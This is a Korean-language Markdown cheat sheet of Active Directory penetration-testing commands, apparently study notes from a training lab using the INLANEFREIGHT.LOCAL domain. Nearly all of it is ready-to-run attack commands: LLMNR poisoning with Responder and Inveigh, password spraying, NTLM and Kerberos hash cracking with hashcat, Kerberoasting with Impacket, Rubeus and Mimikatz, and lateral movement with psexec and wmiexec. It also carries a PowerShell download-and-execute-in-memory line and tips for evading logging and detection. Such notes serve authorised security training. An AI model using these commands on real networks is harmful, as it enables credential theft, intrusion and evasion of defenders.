# Active Directory Enumeration

## 1. 공개 도메인 정보
```nslookup -type=txt domain.com```

<br/><br/>
## 호스트 식별
```sudo tcpdump -i ens224```
```sudo responder -I ens224 -A ```

### FPing Active Check
```fping -asgq 172.16.5.0/23```

### Nmap 스캐닝(-A 공격적 스캔)
```sudo nmap -v -A -iL hosts.txt -oN /home/host-enum```

<br/><br/>
## 2. 사용자 식별

### Kerbrute - 내부 AD 사용자 이름 Enumeration
```
sudo git clone https://github.com/ropnop/kerbrute.git
make help
sudo make all
ls dist/
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt -o valid_ad_users
```
<br/><br/>
## 3. LLMNR & NBT-NS Sniffing

### Responder - Linux
```sudo responder -I ens224```<br/>
```hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt```

### Inveigh - Windows
```Import-Module .\Inveigh.ps1```<br/>
```Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y```

#### C# Inveigh (InveighZero)
```
.\Inveigh.exe
> ESC키
> GET NTLMV2USERNAMES   # 수집된 사용자명
> GET NTLMV2UNIQUE      # 수집된 Hash
```

<br/><br/>
## 4. Password Spraying

### 비밀번호 정책 열거 - 자격증명 (Linux)
```crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol```

### 비밀번호 정책 열거 - SMB NULL Sessions (Linux)
```rpcclient -U "" -N 172.16.5.5```<br/>
```rpcclient $> querydominfo```

### 비밀번호 정책 열거 - enum4linux (Linux)
```enum4linux -P 172.16.5.5```<br/>
```enum4linux-ng -P 172.16.5.5 -oA <outfile>```<br/>
```cat outfile.json```

### 비밀번호 정책 열거 - LDAP Anonymous Bind (Linux)
```ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength```

### 비밀번호 정책 열거 - SMB NULL Sessions (Windows)
```net use \\DC01\ipc$ "" /u:""```              # null session 연결 확인<br/>
```net use \\DC01\ipc$ "" /u:guest```           # Account 비활성화 확인<br/>
```net use \\DC01\ipc$ "password" /u:guest```   # Password 비일치 또는 계정 잠김 확인

### 비밀번호 정책 열거 (Windows)
```net accounts```
```
import-module .\PowerView.ps1
Get-DomainPolicy
```

### SMB NULL Sessions으로 사용자 목록 가져오기
```enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"```
```
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
```
```crackmapexec smb 172.16.5.5 --users```

### LDAP Anonymous를 사용하여 사용자 수집
```ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "```<br/>
```./windapsearch.py --dc-ip 172.16.5.5 -u "" -U```

### Kerbrute를 사용하여 사용자 열거
```kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt```

### 유효한 자격 증명을 사용하여 사용자 열거
```sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users```

<br/><br/>
## 5. Internal Password Spraying - from Linux

### Bash를 이용한 one-liner Attack
```for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done```

### Kerbrute 사용
```kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1```

### CrackMapExec 사용
```sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +```

### CrackMapExec를 사용하여 자격증명 검증
```sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123```

### CrackMapExec를 사용한 Local Admin Spraying
```sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +```

<br/><br/>
## 6. Internal Password Spraying - from Windows

### DomainPasswordSpray.ps1 사용
```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

<br/><br/>
## 7. 보안 설정 Enumerating

### Windows Defender 상태 체크
```Get-MpComputerStatus```

### AppLocker 체크
```Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections```

### Enumerating Language Mode (PowerShell)
```$ExecutionContext.SessionState.LanguageMode```

### LAPS(Local Administrator Password Solution) 체크
```Find-LAPSDelegatedGroups```<br/>
```Find-AdmPwdExtendedRights```<br/>
```Get-LAPSComputers```

<br/><br/>
## 8. 자격증명 Enumerating - from Linux

### 도메인 사용자 열거
```sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users```

### 도메인 그룹 열거
```sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups```

### 로그인한 사용자
```sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users```

### Share Enumeration - Domain Controller
```sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares```

#### Share Enumeration - Spider_plus
```sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'```<br/>
```head -n 10 /tmp/cme_spider_plus/172.16.5.5.json ```

### SMBMap사용하여 Access 체크
```smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5```

### SMBMap사용하여 모든 디렉토리 열거
```smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only```

### rpcclient를 사용한 SMB Null Session 체크
```rpcclient -U "" -N 172.16.5.5```

### Enumdomusers로 모든 사용자 열거
```rpcclient $> enumdomusers```

### rpcclient에서 RID로 User 열거
```rpcclient $> queryuser 0x457```

### Psexec.py로 호스트 연결 (로컬 관리자 권한 사용자 필요)
```psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125```

### wmiexec.py를 사용
```wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5```

### Windapsearch - Domain Admins
```python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da```

### Windapsearch - Privileged Users
```python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU```

### BloodHound.py 실행
```sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all```

<br/><br/>
## 9. 자격증명 Enumerating - from Windows

### ActiveDirectory 모듈 Load
```Import-Module ActiveDirectory```<br/>
```Get-Module```

### Get Domain Info
```Get-ADDomain```

### Get-ADUser
```Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName```

### Trust Relationships 체크
```Get-ADTrust -Filter *```

### Group Enumeration
```Get-ADGroup -Filter * | select name```

### 상세 Group Info
```Get-ADGroup -Identity "Backup Operators"```

### Group Membership
```Get-ADGroupMember -Identity "Backup Operators"```

### PowerView

| **Command**                         | **설명**                                            |
| ----------------------------------- | ------------------------------------------------- |
| `Export-PowerViewCSV`               | 결과를 CSV 파일에 추가                                    |
| `ConvertTo-SID`                     | 사용자 또는 그룹 이름을 SID 값으로 변환                          |
| `Get-DomainSPNTicket`               | 지정된 서비스 주체 이름(SPN) 계정에 대한 Kerberos 티켓을 요청합니다.     |
| **Domain/LDAP Functions:**          |                                                   |
| `Get-Domain`                        | 현재(또는 지정된) 도메인에 대한 AD 개체를 반환합니다.                  |
| `Get-DomainController`              | 지정된 도메인에 대한 도메인 컨트롤러 목록을 반환합니다.                   |
| `Get-DomainUser`                    | AD의 모든 사용자 또는 특정 사용자 개체를 반환합니다.                   |
| `Get-DomainComputer`                | AD의 모든 컴퓨터 또는 특정 컴퓨터 개체를 반환합니다.                   |
| `Get-DomainGroup`                   | AD의 모든 그룹 또는 특정 그룹 개체를 반환합니다.                     |
| `Get-DomainOU`                      | AD에서 모든 OU 개체 또는 특정 OU 개체 검색                      |
| `Find-InterestingDomainAcl`         | 수정 권한이 내장되지 않은 개체로 설정된 도메인에서 개체 ACL을 찾습니다.        |
| `Get-DomainGroupMember`             | 특정 도메인 그룹의 멤버를 반환합니다.                             |
| `Get-DomainFileServer`              | 파일 서버로 작동할 가능성이 있는 서버 목록을 반환합니다.                  |
| `Get-DomainDFSShare`                | 현재(또는 지정된) 도메인에 대한 모든 분산 파일 시스템 목록을 반환합니다.        |
| **GPO Functions:**                  |                                                   |
| `Get-DomainGPO`                     | AD의 모든 GPO 또는 특정 GPO 개체를 반환합니다.                   |
| `Get-DomainPolicy`                  | 현재 도메인에 대한 기본 도메인 정책 또는 도메인 컨트롤러 정책을 반환합니다.       |
| **Computer Enumeration Functions:** |                                                   |
| `Get-NetLocalGroup`                 | 로컬 또는 원격 시스템의 로컬 그룹을 열거합니다.                       |
| `Get-NetLocalGroupMember`           | 특정 로컬 그룹의 멤버를 열거합니다                               |
| `Get-NetShare`                      | 로컬(또는 원격) 머신에서 열려 있는 공유를 반환합니다.                   |
| `Get-NetSession`                    | 로컬(또는 원격) 머신에 대한 세션 정보를 반환합니다.                    |
| `Test-AdminAccess`                  | 현재 사용자에게 로컬(또는 원격) 시스템에 대한 관리 액세스 권한이 있는지 테스트합니다. |
| **Threaded 'Meta'-Functions:**      |                                                   |
| `Find-DomainUserLocation`           | 특정 사용자가 로그인한 컴퓨터를 찾습니다.                           |
| `Find-DomainShare`                  | 도메인 머신에서 접근 가능한 공유를 찾습니다.                         |
| `Find-InterestingDomainShareFile`   | 도메인의 읽기 가능한 공유에서 특정 기준과 일치하는 파일을 검색합니다.           |
| `Find-LocalAdminAccess`             | 현재 사용자가 로컬 관리자 액세스 권한을 가지고 있는 로컬 도메인에서 컴퓨터를 찾습니다. |
| **Domain Trust Functions:**         |                                                   |
| `Get-DomainTrust`                   | 현재 도메인 또는 지정된 도메인에 대한 도메인 신뢰를 반환합니다.              |
| `Get-ForestTrust`                   | 현재 포리스트 또는 지정된 포리스트에 대한 모든 포리스트 트러스트를 반환합니다.      |
| `Get-DomainForeignUser`             | 사용자 도메인 외부의 그룹에 있는 사용자를 열거합니다.                    |
| `Get-DomainForeignGroupMember`      | 그룹 도메인 외부의 사용자가 있는 그룹을 열거하고 각 외국 멤버를 반환합니다.       |
| `Get-DomainTrustMapping`            | 현재 도메인에 대한 모든 신뢰와 그 외에 발견된 모든 신뢰를 나열합니다.          |

### Domain User Information
```Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol```

### 재귀적 Group Membership
```Get-DomainGroupMember -Identity "Domain Admins" -Recurse```

### Trust Enumeration
```Get-DomainTrustMapping```

### Local Admin Access 테스트
```Test-AdminAccess -ComputerName ACADEMY-EA-MS01```

### SPN Set으로 User 찾기
```Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName```

### SharpView를 사용하여 특정 사용자 정보 열거
```.\SharpView.exe Get-DomainUser -Identity <user>```

### Snaffler 실행 (자격증명, 민감 데이터 획득용)
```Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data```

### SharpHound 실행
```SharpHound.exe -c All --zipfilename <outfile>```

<br/><br/>
## 10. Living Off the Land

### 기본 Enumeration 명령

| **Command**                                             | **결과**                                         |
| ------------------------------------------------------- | ---------------------------------------------- |
| `hostname`                                              | PC의 이름을 인쇄합니다                                  |
| `[System.Environment]::OSVersion.Version`               | OS 버전 및 개정 수준을 인쇄합니다.                          |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | 호스트에 적용된 패치 및 핫픽스를 인쇄합니다.                      |
| `ipconfig /all`                                         | 네트워크 어댑터 상태 및 구성을 인쇄합니다.                       |
| `set`                                                   | 현재 세션에 대한 환경 변수 목록을 표시합니다(CMD 프롬프트에서 실행)       |
| `echo %USERDOMAIN%`                                     | 호스트가 속한 도메인 이름을 표시합니다(CMD 프롬프트에서 실행)           |
| `echo %logonserver%`                                    | 호스트가 체크인하는 도메인 컨트롤러의 이름을 인쇄합니다(CMD 프롬프트에서 실행). |

### PowerShell 활용

| **Cmd-Let**                                                                                                                | **설명**                                                                                                                                                             |
| -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `Get-Module`                                                                                                               | 사용을 위해 로드된 사용 가능한 모듈을 나열합니다.                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                | 호스트의 각 범위에 대한 [실행 정책](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) 설정을 인쇄합니다 . |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | 이렇게 하면 `-Scope` 매개변수를 사용하여 현재 프로세스의 정책이 변경됩니다. 이렇게 하면 프로세스를 비우거나 종료하면 정책이 원래대로 돌아갑니다. 피해자 호스트에 영구적인 변경을 하지 않기 때문에 이상적입니다.                                          |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | 키 경로, 사용자, 컴퓨터 정보 등의 환경 값을 반환합니다.                                                                                                                                  |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                 | 이 문자열을 사용하면 지정된 사용자의 PowerShell 기록을 가져올 수 있습니다. 명령 기록에 비밀번호가 포함되어 있거나 비밀번호가 포함된 구성 파일이나 스크립트를 가리킬 수 있으므로 매우 유용할 수 있습니다.                                            |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | 이것은 PowerShell을 사용하여 웹에서 파일을 다운로드하고 메모리에서 호출하는 빠르고 쉬운 방법입니다.                                                                                                       |

```Get-Module```<br/>
```Get-ExecutionPolicy -List```<br/>
```whoami```<br/>
```Get-ChildItem Env: | ft key,value```

### Powershell 다운그레이드 (로깅 우회용)
```powershell.exe -version 2```

### Firewall 체크
```netsh advfirewall show allprofiles```

### Windows Defender 체크
```sc query windefend```     # 실행 여부 확인<br/>
```Get-MpComputerStatus```   # 상태 및 구성 확인

### 로그인한 다른 사용자 확인
```qwinsta```

### 네트워크 정보

| **명령**                             | **설명**                                                        |
| ------------------------------------ | ------------------------------------------------------------- |
| `arp -a`                             | arp 테이블에 저장된 모든 알려진 호스트를 나열합니다.                               |
| `ipconfig /all`                      | 호스트에 대한 어댑터 설정을 출력합니다. 여기서 네트워크 세그먼트를 알아낼 수 있습니다.             |
| `route print`                        | 호스트와 공유되는 알려진 네트워크와 3계층 경로를 식별하는 라우팅 테이블(IPv4 및 IPv6)을 표시합니다. |
| `netsh advfirewall show allprofiles` | 호스트 방화벽의 상태를 표시합니다. 활성화되어 있고 트래픽을 필터링하고 있는지 확인할 수 있습니다.       |

### WMI 체크

| **명령**                                                                               | **설명**                                       |
| ------------------------------------------------------------------------------------ | -------------------------------------------- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | 적용된 핫픽스의 패치 레벨과 설명을 인쇄합니다.                   |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | 목록 내의 모든 속성을 포함하도록 기본 호스트 정보를 표시합니다.         |
| `wmic process list /format:list`                                                     | 호스트의 모든 프로세스 목록                              |
| `wmic ntdomain list /format:list`                                                    | 도메인 및 도메인 컨트롤러에 대한 정보를 표시합니다.                |
| `wmic useraccount list /format:list`                                                 | 장치에 로그인한 모든 로컬 계정 및 모든 도메인 계정에 대한 정보를 표시합니다. |
| `wmic group list /format:list`                                                       | 모든 지역 그룹에 대한 정보                              |
| `wmic sysaccount list /format:list`                                                  | 서비스 계정으로 사용되는 모든 시스템 계정에 대한 정보를 덤프합니다.       |

[WMI Cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)<br/>
```wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress```

### Net 명령

| **명령**                                          | **설명**                                                              |
| ----------------------------------------------- | ------------------------------------------------------------------- |
| `net accounts`                                  | 비밀번호 요구 사항에 대한 정보                                                   |
| `net accounts /domain`                          | 비밀번호 및 잠금 정책                                                        |
| `net group /domain`                             | 도메인 그룹에 대한 정보                                                       |
| `net group "Domain Admins" /domain`             | 도메인 관리자 권한이 있는 사용자 목록                                               |
| `net group "domain computers" /domain`          | 도메인에 연결된 PC 목록                                                      |
| `net group "Domain Controllers" /domain`        | 도메인 컨트롤러의 PC 계정 목록                                                  |
| `net group <domain_group_name> /domain`         | 그룹에 속한 사용자                                                          |
| `net groups /domain`                            | 도메인 그룹 목록                                                           |
| `net localgroup`                                | 사용 가능한 모든 그룹                                                        |
| `net localgroup administrators /domain`         | 도메인 내의 관리자 그룹에 속하는 사용자를 나열합니다(여기에는 기본적으로 `Domain Admins` 그룹이 포함됩니다) |
| `net localgroup Administrators`                 | 그룹(관리자)에 대한 정보                                                      |
| `net localgroup administrators [username] /add` | 관리자에 사용자 추가                                                         |
| `net share`                                     | 현재 공유 확인                                                            |
| `net user <ACCOUNT_NAME> /domain`               | 도메인 내 사용자에 대한 정보 가져오기                                               |
| `net user /domain`                              | 도메인의 모든 사용자를 나열합니다                                                  |
| `net user %username%`                           | 현재 사용자에 대한 정보                                                       |
| `net use x: \computer\share`                    | 공유를 로컬로 마운트합니다                                                      |
| `net view`                                      | 컴퓨터 목록을 받으세요                                                        |
| `net view /all /domain[:domainname]`            | 도메인에 대한 공유                                                          |
| `net view \computer /ALL`                       | 컴퓨터의 주식 목록                                                          |
| `net view /domain`                              | 도메인의 PC 목록                                                          |

```net group /domain```<br/>
```net user /domain wrouse```<br/>
> Trick : net 명령 대신 net1 입력으로 탐지 우회 가능

### Dsquery 명령 (Active Directory 개체 찾기)
``` dsquery user```<br/>
```dsquery computer```<br/>
```dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"```<br/>

### Dsquery 명령 (PASSWD_NOTREQD 플래그 사용자)
```dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl```

### Dsquery 명령 (모든 Domain Controllers 검색, 최대 5개 결과)
```dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName```

<br/><br/>
## 11. Kerberoasting - from Linux

### GetUserSPNs.py로 SPN Accounts 나열
```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend```

### 모든 TGS Tickets 요청
```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request```

### 단일 TGS ticket 요청
```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev```

### TGS Ticket을 출력 파일에 저장
```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs```

### Hashcat으로 오프라인 Ticket Cracking
```hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt```

### 도메인 컨트롤러에 대한 인증 테스트
```sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!```

<br/><br/>
## 12. Kerberoasting - from Windows

### setspn.exe로 SPN 열거
```setspn.exe -Q */*```

### 단일 사용자 타겟팅
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

### setspn.exe를 사용하여 All Tickets 검색
```setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }```

### Mimikatz를 사용하여 메모리에서 티켓 추출
```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

### Cracking을 위한 Base64 Blob 정리 (줄바꿈, 공백 제거)
```echo "<base64 blob>" |  tr -d \\n```

### base64 출력을 .kirbi 파일로 변환
```cat encoded_file | base64 -d > sqldev.kirbi```

### kirbi2john.py를 사용하여 Kerberos Ticket 추출
```python2.7 kirbi2john.py sqldev.kirbi```

### Hashcat을 사용하기 위해 파일 수정
```sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat```

### Hashcat으로 Cracking
```hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt```

### TGS Tickets 추출을 위한 PowerView 사용
```
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

### 특정 사용자 타켓을 위한 PowerView 사용
```Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat```

### 모든 Ticket을 CSV 파일로 내보내기
```Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation```<br/>
```cat .\ilfreight_tgs.csv```

### Rubeus 사용하여 통계 수집 (/stats 플래그)
```Rubeus.exe kerberoast /stats```

### 오프라인 cracking을 위한 명령 (admincount 속성 1, /nowrap 플래그)
```Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap```

### 특정 사용자 Ticket 수집
```Rubeus.exe kerberoast /user:testspn /nowrap```

### 특정 사용자 Ticket 수집 (RC4 암호화만 원할 때, /tgtdeleg 플래그)
```Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap```

